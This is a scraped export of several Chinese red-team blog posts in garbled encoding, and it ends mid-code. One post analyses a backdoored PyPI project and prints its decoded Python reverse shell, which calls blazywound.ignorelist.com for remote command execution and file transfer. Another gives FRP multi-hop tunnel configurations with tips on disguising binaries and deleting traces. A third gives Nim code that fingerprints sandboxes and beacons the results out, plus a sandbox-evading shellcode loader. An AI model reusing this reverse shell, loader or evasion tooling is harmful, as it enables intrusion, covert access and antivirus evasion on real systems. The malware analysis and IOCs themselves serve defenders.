#åŠ å¯†ä»£ç é“¾æ¥ https://dl.dropboxusercontent.com/s/n7xl8ki0k9xqt7x/update.py åŠ å¯†ä»£ç  è§£å¯†åä»£ç  fpyepsdb = chr(105) zbieto = chr(109) + chr(112) + chr(111) + chr(114) + chr(116) + chr(32) + chr(98) + chr(97) ontxmpdwi = chr(115) + chr(101) + chr(54) + chr(52) + chr(59) + chr(101) + chr(120) + chr(101) rdnpqwkiz = chr(99) + chr(40) + chr(39) + chr(39) + chr(46) + chr(106) + chr(111) + chr(105) qvjlktvg = chr(110) + chr(40) + chr(91) + chr(121) + chr(91) + chr(48) + chr(93) + chr(32) nqsokf = chr(102) + chr(111) + chr(114) + chr(32) + chr(120) + chr(32) + chr(105) + chr(110) ... åŒæ ·æ˜¯å¾ˆé•¿çš„ä¸€æ®µåŠ å¯†å­—ç¬¦ä¸² ... qytpmsygab = &quot;&quot; qytpmsygab += fpyepsdb qytpmsygab+= zbieto + ontxmpdwi ... åŒæ ·æ˜¯å¾ˆé•¿çš„ä¸€æ®µåŠ å¯†å­—ç¬¦ä¸² ... qytpmsygab+= xpcexvz + yslqs exec(qytpmsygab) 2.4.3 ä¸‰å±‚åŠ å¯† åŠ å¯†ä»£ç  ä¸Šä¸€æ­¥è§£å¯†åä»£ç ä¸­çš„é‚£æ®µå¾ˆé•¿çš„åŠ å¯†å­—ç¬¦ä¸² è§£å¯†åä»£ç  import base64; exec(''.join([y[0] for x in [x for x in base64.b64decode( ('åŒæ ·æ˜¯å¾ˆé•¿çš„ä¸€æ®µåŠ å¯†å­—ç¬¦ä¸²').encode('ascii') ).decode('ascii')] for y in [[x[0], x[1]] for x in {'\\t': '6', '\\n': 'R', ' ': 'U', '!': 'Y', '@': 'i', '~': 'n', '`': 'Q', '#': '7', '$': 'A', '%': 'E', '^': '$', '&amp;': 'o', '*': 'm', '(': '!', ')': '/', '_': '~', '=': 'L', '-': 'h', '+': ')', '{': 'N', '}': 'O', '|': '\\\\', '\\\\': 'g', '[': 'S', ']': '+', ':': 'z', ';': '|', '&quot;': 's', &quot;'&quot;: '`', ',': '{', '.': 'F', '/': ']', '?': '2', '&gt;': 'y', '&lt;': 'l', '0': '%', '1': 'W', '2': 'H', '3': 'c', '4': '\\n', '5': 'x', '6': 'Z', '7': '.', '8': '&gt;', '9': 'K', 'a': '&lt;', 'b': 'V', 'c': '(', 'd': 'B', 'e': ';', 'f': 'u', 'g': &quot;'&quot;, 'h': 'p', 'i': 'w', 'j': '3', 'k': '}', 'l': '1', 'm': 't', 'n': 'k', 'o': '9', 'p': '?', 'q': 'M', 'u': 'q', 'r': 'a', 's': '0', 't': '\\t', 'v': 'J', 'w': '=', 'x': 'T', 'y': '_', 'z': 'G', 'A': '[', 'B': '&amp;', 'C': '4', 'D': '-', 'E': '@', 'F': 'e', 'G': '^', 'H': 'f', 'I': '8', 'J': '*', 'K': 'D', 'L': '#', 'M': 'C', 'N': ' ', 'O': 'b', 'P': 'P', 'Q': 'X', 'U': ',', 'R': '&quot;', 'S': 'd', 'T': 'j', 'V': 'I', 'W': 'v', 'X': '5', 'Y': ':', 'Z': 'r'}.items()] if x == y[1]])) 2.4.4 å››å±‚åŠ å¯† åŠ å¯†ä»£ç  ä¸Šä¸€æ­¥è§£å¯†åä»£ç ä¸­çš„é‚£æ®µå¾ˆé•¿çš„åŠ å¯†å­—ç¬¦ä¸² è§£å¯†åä»£ç  from cryptography.fernet import Fernet encrypted_message = 'åŒæ ·æ˜¯å¾ˆé•¿çš„ä¸€æ®µåŠ å¯†å­—ç¬¦ä¸²' key = b'fFdnVFFLuGqYOndl9Xvp9pRnOenZ__grZS5sFssfiX4=' f = Fernet(key) decrypted_message = f.decrypt(encrypted_message.encode()) exec(decrypted_message.decode()) 2.4.5 äº”å±‚åŠ å¯† åŠ å¯†ä»£ç  ä¸Šä¸€æ­¥è§£å¯†åä»£ç ä¸­çš„é‚£æ®µå¾ˆé•¿çš„åŠ å¯†å­—ç¬¦ä¸² è§£å¯†åä»£ç  import codecs exec(codecs.decode(b'åŒæ ·æ˜¯å¾ˆé•¿çš„ä¸€æ®µåŠ å¯†å­—ç¬¦ä¸²', &quot;hex&quot;).decode()) 2.4.6 å…­å±‚åŠ å¯† åŠ å¯†ä»£ç  ä¸Šä¸€æ­¥è§£å¯†åä»£ç ä¸­çš„é‚£æ®µå¾ˆé•¿çš„åŠ å¯†å­—ç¬¦ä¸² è§£å¯†åä»£ç  import gzip code = b&quot;åŒæ ·æ˜¯å¾ˆé•¿çš„ä¸€æ®µåŠ å¯†å­—ç¬¦ä¸²&quot;.decode() exec(gzip.decompress(code.encode('cp437')).decode()) 2.4.7 ä¸ƒå±‚åŠ å¯† åŠ å¯†ä»£ç  è§£å¯†åä»£ç  import socket import json import subprocess import time import os import sys def reliable_send(data): jsondata = json.dumps(data) s.send(jsondata.encode()) def reliable_recv(): data = '' while True: try: data = data + s.recv(1024).decode().rstrip() return json.loads(data) except ValueError: continue def download_file(file_name): f = open(file_name, 'wb') s.settimeout(2) chunk = s.recv(1024) while chunk: f.write(chunk) try: chunk = s.recv(1024) except socket.timeout as e: break s.settimeout(None) f.close() def upload_file(file_name): f = open(file_name, 'rb') s.send(f.read()) def shell(): while True: command = reliable_recv() if command == 'quit': break elif command == 'background': # BEGIN pass elif command == 'help': # ideally to be removed pass elif command == 'clear': pass # END elif command[:3] == 'cd ': os.chdir(command[3:]) elif command[:6] == 'upload': download_file(command[7:]) elif command[:8] == 'download': upload_file(command[9:]) elif command[:7] == 'sendall': subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) else: execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) result = execute.stdout.read() + execute.stderr.read() result = result.decode() reliable_send(result) def connection(): while True: time.sleep(5) try: s.connect(('blazywound.ignorelist.com', 5008)) shell() s.close() break except: connection() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) connection() 2.5 é¡¹ç›®ä½œè€… é€šè¿‡å¯¹æŠ•æ¯’é¡¹ç›®çš„å®¿ä¸»è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°æ­¤ç”¨æˆ·è‡ªç§°ä¸ºæ¼æ´èµé‡‘çŒäººå’Œæ¸—é€æµ‹è¯•äººå‘˜çš„ä¸€åå¤§å­¦ç”Ÿï¼Œè‡ªæˆ‘ä»‹ç»åŒ…è£…çš„å‡ ä¹å®Œç¾ï¼Œä¸”æ‹¥æœ‰è¿‘300åçš„å…³æ³¨è€…ï¼Œå…±å‘å¸ƒ35ä¸ªåŸåˆ›çº¢é˜Ÿç›¸å…³é¡¹ç›®ã€‚ https://github.com/machine1337?tab=repositories&amp;q=&amp;type=source&amp;language=&amp;sort= ç»è¿‡è°ƒæŸ¥ï¼Œæ‰€æœ‰Pythoné¡¹ç›®éƒ½æ˜¯ç›¸åŒæ‰‹æ³•ï¼Œé€šè¿‡PYPIä¾èµ–åº“è¿›è¡Œéƒ¨ç½²åé—¨ï¼Œæ—©æœŸé¡¹ç›®è¿˜æœ‰ä½¿ç”¨shæ–‡ä»¶çš„æ‰‹æ³•ï¼Œæœ€æ—©çš„åé—¨é¡¹ç›®å­˜åœ¨äº2021.9.24ï¼Œå¹¶äº2022.11æœˆåˆ°12æœˆè´¦å·æ¢å¤æ´»è·ƒã€‚ 0x03 åˆ†æç»“æœ ä¸€å2022.11æœˆåˆ°12æœˆæ¢å¤æ´»è·ƒçš„ä¸“é—¨é’ˆå¯¹çº¢é˜Ÿçš„é’“é±¼äººå‘˜æˆ–è€…æŸä¸ªç»„ç»‡ï¼Œé€šè¿‡æŠ•æ¯’PYPIä¾èµ–åº“ï¼Œå†å‘å¸ƒåå¤„ç†å…æ€é¡¹ç›®åŠå…¶ä»–çº¢é˜Ÿé¡¹ç›®è¿›è¡Œå¯¼å…¥ä¾èµ–ï¼Œç»è¿‡ä¸ƒå±‚ä¸­è½¬çš„åŠ å¯†ä»£ç ï¼Œæœ€ç»ˆä¸blazywound.ignorelist.co:5008è¿›è¡Œsocketé€šä¿¡è¿›è¡Œä¸Šçº¿æœºå™¨ï¼Œåé—¨å®é™…æ‹¥æœ‰çš„åŠŸèƒ½ä¸º: åˆ‡æ¢å·¥ä½œç›®å½•ã€ä¸Šä¼ æ–‡ä»¶ã€ä¸‹è½½æ–‡ä»¶ã€ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚ 0x04 IOC Host blazywound.ignorelist.co:5008 Hash Linux md5 Hash /tmp/file.py ee69b2d189165555d4ec32f944cb262c /home/$USER/.msfdb/update/.path.sh 5412834b8be0ee5cdeeede11430ca17c /home/$USER/.msfdb/update/update.py c855106e06b259d2b30bd754561ea9a ","link":"https://www.svenbeast.com/post/ZVscVsf50/"},{"title":"redteamä¹‹å®æˆ˜éš§é“ä»£ç†æ–¹æ¡ˆ","content":"0x01 æµ…è¨€ â€‹ åœ¨çº¢é˜Ÿè¡ŒåŠ¨ä¸­ï¼Œæ­å»ºéš§é“å‡ ä¹å¯ä»¥è¯´æ˜¯å¿…é‡åˆ°çš„æ”»å‡»åœºæ™¯ä¹‹ä¸€ï¼Œæ‰€ä»¥æå‰å‡†å¤‡å¥½ç›¸åº”çš„éš§é“ä»£ç†æ–¹æ¡ˆå¯¹äºæé«˜æ”»å‡»æ•ˆç‡å°¤ä¸ºé‡è¦ï¼Œå®é™…é¡¹ç›®ä¸­ä¼šé‡åˆ°çš„é—®é¢˜ä¹Ÿæ˜¯æœ¬æ–‡ä¸»è¦è§£å†³çš„é—®é¢˜å¦‚ä¸‹: 1.æ¯å¤šä¸€å±‚ä»£ç†å°±é‡å¤´å¼€å§‹æ­å»ºä¸€æ¬¡éš§é“ï¼Œæ— åºä¸”æ··ä¹± 2.æ€è½¯æŸ¥æ€ 3.ä»£ç†è¿›ç¨‹ç‰¹å¾æ˜æ˜¾ï¼Œè¢«ç›®æ ‡æˆ–å…¶ä»–é˜Ÿä¼å‘ç°å¼‚å¸¸å¯¼è‡´ä»£ç†æ‰çº¿ï¼Œå°†æ—¶é—´æµªè´¹åœ¨é‡å¤æ­å»ºçš„è¿‡ç¨‹ä¸­ 0x02 æ‹“æ‰‘å›¾åŠå·¥å…· é¡¹ç›®åœ°å€: https://github.com/DongHuangT1/Frp æ­¤äºŒå¼€ç‰ˆæ”¯æŒwebsocketåè®®çš„åŸŸå‰ç½®ï¼Œå°†ç”¨åšå…¥å£ç‚¹æœºå™¨çš„éš§é“æ­å»º é¡¹ç›®åœ°å€: https://github.com/Goqi/Erfrp æ­¤äºŒå¼€ç‰ˆä¿®æ”¹äº†æµé‡ç‰¹å¾ï¼Œå°†ç”¨åšå†…ç½‘æœºå™¨çš„éš§é“æ­å»º FRPå¤šçº§ä»£ç†æ‹“æ‰‘å›¾: https://github.com/sv3nbeast/Frp-Mapping æ–‡å­—æè¿°ç¹çä¸”ä¸å¥½ç†è§£ï¼Œè¿™é‡Œç”»ä¸€ä¸ªå¤šçº§ä»£ç†çš„æ‹“æ‰‘å›¾æ–¹ä¾¿ç†è§£ â€‹ å®é™…ä¸Šfrpç»è¿‡ä¿®æ”¹è¿‡çš„æºç æ€è½¯æŸ¥æ€å¹¶ä¸ä¸¥é‡ï¼Œæ‰€ä»¥äºŒå¼€è¿‡çš„frpï¼Œè¿‡æ€è½¯å¯ä»¥ç®—æ˜¯ä¸€ä¸ªè¢«åŠ¨æŠ€èƒ½ï¼Œè‹¥æœ‰ä¹ æƒ¯å…¶ä»–ä¼˜ç§€éš§é“è½¯ä»¶çš„ï¼Œå¦‚stowawayã€fusoã€npsç­‰ï¼Œæ¨èæŒ‰æ­¤æ–‡ç†æ¸…ä»£ç†é€»è¾‘è¿›è¡Œæ–¹æ¡ˆå¤åˆ»ã€‚ 0x03 ä»£ç†æµç¨‹ â€‹ é€šè¿‡ç¼–å†™çš„å¤šçº§ä»£ç†æ‹“æ‰‘å›¾å¯ä»¥å‘ç°ä¸åŒå±‚çº§ä»£ç†çš„ä¸€ç‚¹åŒºåˆ«ï¼Œæ— è®ºæ˜¯å…¥å£ç‚¹æœºå™¨è¿˜æ˜¯å†…ç½‘æœºå™¨æ— éå°±æ˜¯æå‰åœ¨å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶å†…å†™å¥½å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„ç«¯å£å¯¹åº”ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆä¸ä»ä¸€å¼€å§‹å°±ä½¿ç”¨å¤šçº§ä»£ç†çš„é…ç½®æ–‡ä»¶ä»è€Œé¿å…å†…ç½‘æ¨ªå‘åé‡æ–°æ­å»ºäºŒå±‚ã€ä¸‰å±‚ä»£ç†å‘¢ï¼Œé‚è¿™é‡Œæä¾›ä¸ªäººåœ¨ä½¿ç”¨çš„æœ€é«˜æ”¯æŒä¸‰çº§ä»£ç†çš„é…ç½®æ–‡ä»¶ã€‚ ! 1.å…¬ç½‘æœåŠ¡ç«¯ #frps.ini [common] token = xxxxxx bind_port = 80 websocket_path = /xxxxx dingding_token = 2.å…¥å£ç‚¹å®¢æˆ·ç«¯ #frpc.ini [common] token = xxxxxx del_enable = true server_addr = author.xxx.com.xx.xx.com.cn server_port = 80 protocol = websocket websocket_path = /xxxxx websocket_host = author.xxx.com [socks5_to_1] type = tcp remote_port = 20000 plugin = socks5 plugin_user = admin plugin_passwd = admin123 use_encryption = true use_compression = true [socks5_to_2] type = tcp local_ip = 127.0.0.1 local_port = 10088 remote_port = 12020 [socks5_to_3] type = tcp local_ip = 127.0.0.1 local_port = 11088 remote_port = 13020 3.å…¥å£ç‚¹æœåŠ¡ç«¯ #frps.ini [common] bind_port = 7000 4.äºŒçº§ä»£ç†æœºå®¢æˆ·ç«¯ #frpc.ini [common] #å…¥å£ç‚¹æœåŠ¡ç«¯æœºå™¨çš„IP server_addr = 192.168.3.75 server_port = 7000 [socks5_to_1] type = tcp plugin = socks5 remote_port = 10088 [socks5_to_2] type = tcp local_ip = 127.0.0.1 local_port = 12088 remote_port = 11088 5.äºŒçº§ä»£ç†æœºæœåŠ¡ç«¯ #frps.ini [common] bind_port = 7000 6.ä¸‰çº§ä»£ç†æœºå®¢æˆ·ç«¯ #frpc.ini [common] #äºŒçº§ä»£ç†æœåŠ¡ç«¯æœºå™¨çš„IP server_addr = 192.168.3.144 server_port = 7000 [socks5_to_1] type = tcp plugin = socks5 remote_port = 12088 ä¸åŒå±‚çº§ä»£ç†è¿æ¥åœ°å€ å…¥å£ç‚¹æœºå™¨ä»£ç† socks5 100.100.100.100:20000 admin admin123 äºŒçº§ä»£ç†æœºå™¨ä»£ç† socks5 100.100.100.100:12020 æ— å¯†ç  ä¸‰çº§ä»£ç†æœºå™¨ä»£ç† socks5 100.100.100.100:13020 æ— å¯†ç  â€‹ ä¸Šé¢æ˜¯æœ€å¤šæ”¯æŒä¸‰çº§ä»£ç†çš„å„ä¸ªé…ç½®æ–‡ä»¶å’Œè¿æ¥ä¿¡æ¯ï¼Œæ¯æ¬¡é¡¹ç›®å¼€å§‹æ­å»ºç¬¬ä¸€ä¸ªéš§é“æ—¶ç›´æ¥æŒ‰ç…§ä¸‰çº§ä»£ç†çš„å±‚çº§è¿›è¡Œæ­å»ºå³å¯ï¼Œæ¯å¤šä¸€å±‚ç›´æ¥åœ¨ä¸‹ä¸€å°æœºå™¨è¿›è¡Œè¿æ¥ã€‚ æ³¨: å› ä¸ºä½¿ç”¨äº†2ç§äºŒå¼€ç‰ˆfrpï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨æ—¶éœ€ä¿è¯å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¸ºåŒä¸€ç§frp 0x04 ç®—ä¸ä¸Štipsçš„tips å¯åŠ¨æ–¹å¼ â€‹ frpé»˜è®¤ä¼šåŠ è½½å½“å‰ç›®å½•ä¸‹çš„frpc.iniæ–‡ä»¶ï¼Œå»ºè®®ç›´æ¥ä¿®æ”¹æºå¸¦ä¼ªè£…æ€§çš„frpæ–‡ä»¶åå­—ï¼Œå¦‚linuxçš„agentã€windowsçš„svchost.exeï¼Œå¹¶ä¸Šä¼ frpc.iniåˆ°å½“å‰ç›®å½•ï¼Œè¿™æ ·ç›´æ¥å¯åŠ¨ä¸éœ€è¦æºå¸¦ä»»ä½•å‚æ•°ï¼Œç„¶ååˆ é™¤é…ç½®æ–‡ä»¶å³å¯ï¼Œè™½ç„¶å¾ˆå¤šäººä½¿ç”¨çš„frpæ”¯æŒhttpè¿œç¨‹åŠ è½½å’ŒåŠ å¯†å‚æ•°ä¼ è¾“ï¼Œä½†å°±ç‰¹å¾è€Œè¨€ï¼Œæ˜¯å¾ˆæ˜æ˜¾çš„ï¼Œé€šè¿‡ä¼ å‚è¿›è¡Œç¡®å®šæ›¾ç»killè¿‡å¾ˆå¤šå…¶ä»–é˜Ÿä¼çš„ä»£ç†å·¥å…·ï¼Œæ‰€ä»¥ä¸å»ºè®®ä¼ ä»»ä½•å‚æ•°ã€‚ å¦‚æœè§‰å¾—ä¸Šä¼ frpc.iniæ–‡ä»¶ä¸ä¹ æƒ¯ï¼Œå¯ä»¥ä¿®æ”¹æ­¤æ–‡ä»¶/cmd/frpc/sub/root.goï¼Œå°†é»˜è®¤åŠ è½½çš„é…ç½®æ–‡ä»¶æ”¹æˆå…¶ä»–åå­—é‡æ–°ç¼–è¯‘ã€‚ åˆ é™¤æ–‡ä»¶ â€‹ linuxå¯åŠ¨ä»£ç†åä¸å…‰å¯ä»¥åˆ é™¤é…ç½®æ–‡ä»¶ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶ä¹Ÿå¯ä»¥ä¸€èµ·åˆ æ‰ï¼Œä¸ä¼šå½±å“å·²å¯åŠ¨å¾—ä»£ç†è¿›ç¨‹ï¼Œåœ¨linuxæœºä¸­å…»æˆå¥½ä¹ æƒ¯ï¼Œè¿è¡Œååˆ é™¤æ–‡ä»¶ 0x05 ç»“æŸ å†æ€»ç»“ä¸€ä¸‹ä¼˜ç‚¹: æŒ‰éƒ¨å°±ç­ï¼Œé€»è¾‘æ¸…æ™°ï¼Œæ¯æ¬¡åªéœ€ä¿®æ”¹é…ç½®æ–‡ä»¶ä¸­çš„ip æ­å»ºå¥½åå¯ä»¥ä»»æ„é€‰æ‹©å±‚çº§è¿›è¡Œè¿æ¥ï¼Œè€Œä¸æ˜¯åªèƒ½è¿æ¥ä¸€å±‚ ä¸å¿…è€ƒè™‘æ€è½¯ æ— è¿›ç¨‹ç‰¹å¾ ","link":"https://www.svenbeast.com/post/NIsft997g/"},{"title":"Pentesting active directory æ€è·¯ä¸€è§ˆå›¾","content":" å‚è€ƒé“¾æ¥: https://github.com/Orange-Cyberdefense/ocd-mindmaps ","link":"https://www.svenbeast.com/post/flYRjNxuy/"},{"title":"Nimä¹‹Bypass Sandboxå’Œå…æ€çš„è¿‡ç¨‹è®°å½•","content":"0x01 è·å¾—å„æ²™ç®±å¹³å°çš„ç³»ç»Ÿä¿¡æ¯ åˆ©ç”¨barkè½¯ä»¶æ¥å—httpè¯·æ±‚ï¼Œå›æ˜¾æ²™ç®±ç³»ç»Ÿé…ç½® è·å¾—cpuå’Œè¿è¡Œå†…å­˜ï¼Œé€šç”¨æ²™ç®±è¿‡æ»¤ &lt;2 &lt;2048çš„æœºå™¨ å¾®æ­¥Win10æ²™ç®±cpuä¸º4æ ¸ï¼Œè¿è¡Œå†…å­˜6143mbï¼ŒCç›˜å®¹é‡136829726720 å¾®æ­¥Win7_x64æ²™ç®±cpuä¸º4æ ¸ï¼Œè¿è¡Œå†…å­˜6143mbï¼ŒCç›˜å®¹é‡137331994624 å¥‡å®‰ä¿¡æ²™ç®±cpuä¸º4æ ¸ï¼Œè¿è¡Œå†…å­˜8190mbï¼ŒCç›˜å®¹é‡322015588352 cpuä¸º4æ ¸ï¼Œè¿è¡Œå†…å­˜8191mbï¼Œ Cç›˜å®¹é‡239981297664 (è¿™ä¸ªå¤§æ¦‚ç‡æ˜¯QAXçš„ï¼Œä¸å¤ªç¡®å®šï¼Œä¸æ˜¯ç›´æ¥æ”¶åˆ°çš„è¯·æ±‚) VTå¹³å°æ²™ç®±ï¼Œä¼šæœ‰å¾ˆå¤šè¯·æ±‚ï¼Œæ ¹æ®ä»£ç è®¾ç½®çš„æ—¶é—´æˆ³åŒºåˆ†æ”¶åˆ°çš„æœºå™¨é…ç½® å…·ä½“éƒ½ä»€ä¹ˆé…ç½®è‡ªè¡Œå°è¯•ï¼ŒæŒºå¤šçš„ï¼Œä¸”å¸¦æœ‰æŒç»­æ€§ï¼Œåœä¸ä¸‹æ¥ï¼Œå¾ˆå¤šäººç”¨vtçš„æ¥å£ä¸‹è½½ä¸‹æ¥åˆ†æ åé¢å‘ç°å¤§éƒ¨åˆ†çš„VTæ²™ç®±éƒ½å¯ä»¥æ ¹æ®é€šç”¨æ²™ç®±è¿‡æ»¤è§„åˆ™è¿‡æ»¤æ‰ï¼Œå‡ºç°æœ€å¤šçš„é…ç½®æ˜¯2047å’Œ2 360çš„åœ¨çº¿æ²™ç®±å¹³å°ä¸æ”¯æŒx64ç¨‹åºï¼Œæ‰€ä»¥ä¸æ„æˆå¨èƒï¼Œ360å®‰å…¨å«å£«æˆ–è€…æ€æ¯’çš„è‡ªåŠ¨ä¸Šä¼ æœ¬åœ°æ–‡ä»¶åˆ°äº‘æ²™ç®±åŠŸèƒ½è¿˜æ²¡æ—¶é—´æµ‹è¯• ä¸‹é¢æ˜¯ä½¿ç”¨NIMè·å¾—æˆ‘æƒ³è¦çš„ä¿¡æ¯çš„å…·ä½“ä»£ç ï¼Œè€Œä¸”å¿…é¡»åæ§½ä¸€ä¸‹ï¼ŒNIMå¾ˆæ¶å¿ƒï¼Œå¯ä»¥è¯´æ˜¯ctrl c vçš„å®¿æ•Œï¼Œèµ„æ–™å°‘çš„å¯æ€œåˆ°çˆ†ç‚¸ import winlean,HttpClient,times #auther:https://github.com/sv3nbeast type TPartitionInfo* = tuple[FreeSpace, TotalSpace: FileTime] HANDLE* = int HWND* = HANDLE UINT* = int32 LPCSTR* = cstring let randNum = $getTime().toUnix() proc getFileSize*(file: string): BiggestInt = ## Retrieves the size of the specified file. var fileData: WIN32_FIND_DATA when useWinUnicode: var aa = newWideCString(file) let hFile = findFirstFileW(aa, fileData) else: let hFile = findFirstFileA(file, fileData) if hFile == INVALID_HANDLE_VALUE: raise newException(IOError, $getLastError()) return fileData.nFileSizeLow proc getDiskFreeSpaceEx*(lpDirectoryName: cstring, lpFreeBytesAvailableToCaller, lpTotalNumberOfBytes, lpTotalNumberOfFreeBytes: var FileTime): WINBOOL{. stdcall, dynlib: &quot;kernel32&quot;, importc: &quot;GetDiskFreeSpaceExA&quot;.} #è·å¾—ç£ç›˜æƒ…å†µ proc getPartitionInfo*(partition: string): TPartitionInfo = # Retrieves partition info, for example ``partition`` may be ``&quot;C:\\&quot;`` #freeBytes:å·²ä½¿ç”¨å­—èŠ‚ #totalBytes:ç£ç›˜æ€»å®¹é‡ var freeBytes, totalBytes, totalFreeBytes: FileTime discard getDiskFreeSpaceEx(partition, freeBytes, totalBytes, totalFreeBytes) # var num = rdFileTime(totalBytes) # var client = newHttpClient() # var url = &quot;http://api.day.app/VRzPbPFcQCYKtS3wr7Tbgf/disk/&quot; #è·å¾—ç£ç›˜æ€»å®¹é‡ # url.add($randNum) # url.add(&quot;: &quot;) # url.add($num) # try: # var err = client.getContent(url) # except: # return (freeBytes,totalBytes) return (freeBytes,totalBytes) #è·å–cpuæ•°é‡ proc huasidsiuohiuodsaih():int = when defined(windows): type SYSTEM_INFO {.final, pure.} = object u1: int32 dwPageSize: int32 lpMinimumApplicationAddress: pointer lpMaximumApplicationAddress: pointer dwActiveProcessorMask: ptr int32 dwNumberOfProcessors: int32 dwProcessorType: int32 dwAllocationGranularity: int32 wProcessorLevel: int16 wProcessorRevision: int16 proc GetSystemInfo(lpSystemInfo: var SYSTEM_INFO) {.stdcall, dynlib: &quot;kernel32&quot;, importc: &quot;GetSystemInfo&quot;.} var si: SYSTEM_INFO GetSystemInfo(si) # var num = si.dwNumberOfProcessors # var client = newHttpClient() # var url = &quot;http://api.day.app/VRzPbPFcQCYKtS3wr7Tbgf/cpu/&quot; # url.add($randNum) # url.add(&quot;: &quot;) # url.add($num) # try: # var err = client.getContent(url) # except: # return si.dwNumberOfProcessors return si.dwNumberOfProcessors #è·å–å†…å­˜å¤§å° proc ihojhhasioadsoiihodas():int64 = when defined(windows): type TMEMORYSTATUSEX {.final, pure.} = object dwLength: int32 dwMemoryLoad: int32 ullTotalPhys: int64 ullAvailPhys: int64 ullTotalPageFile: int64 ullAvailPageFile: int64 ullTotalVirtual: int64 ullAvailVirtual: int64 ullAvailExtendedVirtual: int64 proc globalMemoryStatusEx(lpBuffer: var TMEMORYSTATUSEX) {.stdcall, dynlib: &quot;kernel32&quot;,importc: &quot;GlobalMemoryStatusEx&quot;.} var statex: TMEMORYSTATUSEX statex.dwLength = sizeof(statex).int32 globalMemoryStatusEx(statex) # var num = statex.ullTotalPhys shr 20 # var client = newHttpClient() # var url = &quot;http://api.day.app/VRzPbPFcQCYKtS3wr7Tbgf/ram/&quot; # url.add($randNum) # url.add(&quot;: &quot;) # url.add($num) # try: # var err = client.getContent(url) # except: # return statex.ullTotalPhys shr 20 return statex.ullTotalPhys shr 20 when defined(windows): when isMainModule: var huasidsiuohiuodsaih1 = huasidsiuohiuodsaih() #cpu var ihojhhasioadsoiihodas1 = ihojhhasioadsoiihodas() #ram var saolkpomsiejskraqjgir1 = rdFileTime(getPartitionInfo(r&quot;C:\\&quot;)[1]) #disk var client = newHttpClient() var url = &quot;http://api.day.app/VRzPbPFcQCYKtS3wr7Tbgf/Defender/&quot; url.add($huasidsiuohiuodsaih1) url.add(&quot;:&quot;) url.add($ihojhhasioadsoiihodas1) url.add(&quot;:&quot;) url.add($saolkpomsiejskraqjgir1) var jsfile = &quot;https://hectorstatic.baidu.com/cd37ed75a9387c5b.js&quot; try: var err = client.getContent(url) except: echo &quot;Success!&quot; 0x02 åˆ¶ä½œå…æ€EXE å…·ä½“ä»£ç  å¸¦å…æ²™ç®±ä»£ç çš„NIMæ‰§è¡Œshellcodeä»£ç ï¼Œç›®å‰VTçš„æ²™ç®±ç‰¹å¾æ²¡åŠ ï¼Œæœ‰å¾…æ”¶é›†é½å…¨ï¼Œæœ‰ç©ºå†è¯´å§ import winlean,HttpClient,winim #auther:https://github.com/sv3nbeast type TPartitionInfo* = tuple[FreeSpace, TotalSpace: winlean.FILETIME] HANDLE* = int HWND* = HANDLE UINT* = int32 LPCSTR* = cstring proc MessageBox*(hWnd: HWND, lpText: LPCSTR, lpCaption: LPCSTR, uType: UINT): int32 {.discardable, stdcall, dynlib: &quot;user32&quot;, importc: &quot;MessageBoxA&quot;.} proc getFileSize*(file: string): BiggestInt = ## Retrieves the size of the specified file. var fileData: winlean.WIN32_FIND_DATA when useWinUnicode: var aa = newWideCString(file) let hFile = findFirstFileW(aa, fileData) else: let hFile = findFirstFileA(file, fileData) if hFile == winlean.INVALID_HANDLE_VALUE: raise newException(IOError, $getLastError()) return fileData.nFileSizeLow proc getDiskFreeSpaceEx*(lpDirectoryName: cstring, lpFreeBytesAvailableToCaller, lpTotalNumberOfBytes, lpTotalNumberOfFreeBytes: var winlean.FILETIME): winlean.WINBOOL{. stdcall, dynlib: &quot;kernel32&quot;, importc: &quot;GetDiskFreeSpaceExA&quot;.} #è·å¾—ç£ç›˜æƒ…å†µ proc getPartitionInfo*(partition: string): TPartitionInfo = #freeBytes:å·²ä½¿ç”¨å­—èŠ‚ #totalBytes:ç£ç›˜æ€»å®¹é‡ var freeBytes, totalBytes, totalFreeBytes: winlean.FILETIME discard getDiskFreeSpaceEx(partition, freeBytes, totalBytes, totalFreeBytes) return (freeBytes,totalBytes) #è·å–cpuæ•°é‡ proc huasidsiuohiuodsaih():int = when defined(windows): type SYSTEM_INFO {.final, pure.} = object u1: int32 dwPageSize: int32 lpMinimumApplicationAddress: pointer lpMaximumApplicationAddress: pointer dwActiveProcessorMask: ptr int32 dwNumberOfProcessors: int32 dwProcessorType: int32 dwAllocationGranularity: int32 wProcessorLevel: int16 wProcessorRevision: int16 proc GetSystemInfo(lpSystemInfo: var SYSTEM_INFO) {.stdcall, dynlib: &quot;kernel32&quot;, importc: &quot;GetSystemInfo&quot;.} var si: SYSTEM_INFO GetSystemInfo(si) return si.dwNumberOfProcessors #è·å–å†…å­˜å¤§å° proc ihojhhasioadsoiihodas():int64 = when defined(windows): type TMEMORYSTATUSEX {.final, pure.} = object dwLength: int32 dwMemoryLoad: int32 ullTotalPhys: int64 ullAvailPhys: int64 ullTotalPageFile: int64 ullAvailPageFile: int64 ullTotalVirtual: int64 ullAvailVirtual: int64 ullAvailExtendedVirtual: int64 proc globalMemoryStatusEx(lpBuffer: var TMEMORYSTATUSEX) {.stdcall, dynlib: &quot;kernel32&quot;,importc: &quot;GlobalMemoryStatusEx&quot;.} var statex: TMEMORYSTATUSEX statex.dwLength = sizeof(statex).int32 globalMemoryStatusEx(statex) return statex.ullTotalPhys shr 20 proc innerMain(shellcode: ptr, size: int): void = #shellcodeæ‰§è¡Œä¸»ä½“ let tProcess = GetCurrentProcessId() var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess) let rPtr = VirtualAllocEx( pHandle, NULL, cast[SIZE_T](size), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE ) copyMem(rPtr, shellcode, size) let f = cast[proc(){.nimcall.}](rPtr) f() when defined(windows): when isMainModule: # MessageBox(0, 